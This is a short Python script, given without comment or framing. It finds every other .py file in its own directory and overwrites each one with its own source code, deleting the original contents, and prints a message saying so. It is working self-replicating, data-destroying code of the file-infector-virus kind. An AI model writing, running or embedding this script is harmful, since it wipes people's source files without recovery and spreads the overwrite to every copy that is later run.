import os

def find_py_files(directory):
    py_files = [file for file in os.listdir(directory) if file.endswith('.py') and file != os.path.basename(__file__)]
    return py_files

def copy_script_to_files(py_files, script_path, directory):
    with open(script_path, 'r') as f:
        script_code = f.read()

    for file in py_files:
        file_path = os.path.join(directory, file)
        with open(file_path, 'w') as f:
            f.write(script_code)

def main():
    script_path = os.path.abspath(__file__)
    directory = os.path.dirname(script_path)
    py_files = find_py_files(directory)

    if py_files:
        copy_script_to_files(py_files, script_path, directory)
        print("Script copied into all Python files (existing code deleted)!")
    else:
        print("No Python files found in the directory (excluding the main file)!")

if __name__ == "__main__":
    main()